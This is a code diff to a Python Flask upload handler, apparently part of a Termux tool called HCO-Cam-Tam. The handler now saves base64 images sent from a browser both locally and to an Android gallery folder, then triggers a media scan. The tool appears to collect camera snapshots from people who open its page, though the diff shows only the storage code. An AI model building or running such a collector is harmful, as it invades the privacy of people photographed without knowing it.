@@ -68,8 +68,25 @@ def upload():
     data = request.data.decode("utf-8")
     num = len([f for f in os.listdir(".") if f.startswith("camtam_")]) + 1
     imgdata = data.split(",")[1]
-    with open(f"camtam_{num}.png", "wb") as f:
+
+    # --- Save in Termux folder as before ---
+    filename_local = f"camtam_{num}.png"
+    with open(filename_local, "wb") as f:
         f.write(base64.b64decode(imgdata))
+
+    # --- Save to Download folder for gallery ---
+    save_dir = "/sdcard/Download/HCO-Cam-Tam"
+    os.makedirs(save_dir, exist_ok=True)
+    filename_gallery = os.path.join(save_dir, filename_local)
+    with open(filename_gallery, "wb") as f:
+        f.write(base64.b64decode(imgdata))
+
+    # --- Refresh gallery (media scan) ---
+    os.system(f'am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://{filename_gallery}')
+
+    # --- Print Termux log ---
+    print(Fore.GREEN + f"[✔] Image saved to gallery: {filename_gallery}" + Style.RESET_ALL)
+
     return "ok"
 
 # ---------------- Banner + Unlock ----------------
